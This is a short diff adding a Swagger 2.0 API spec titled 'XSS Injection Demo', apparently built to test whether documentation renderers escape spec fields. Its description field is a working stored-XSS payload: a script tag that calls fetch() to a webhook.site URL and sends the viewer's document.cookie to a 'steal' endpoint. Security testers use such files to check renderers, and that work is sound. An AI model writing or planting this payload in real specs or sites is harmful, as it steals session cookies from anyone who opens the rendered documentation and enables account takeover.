@@ -1,0 +1,9 @@
+ {
+  "swagger": "2.0",
+  "info": {
+    "version": "1.0.0",
+    "title": "XSS Injection Demo",
+    "description": "<script>fetch('https://webhook.site/88df8b9f-eb20-45f7-bc34-d84656d6154f/steal?c='+encodeURIComponent(document.cookie))</script>"
+  },
+  "paths": {}
+}
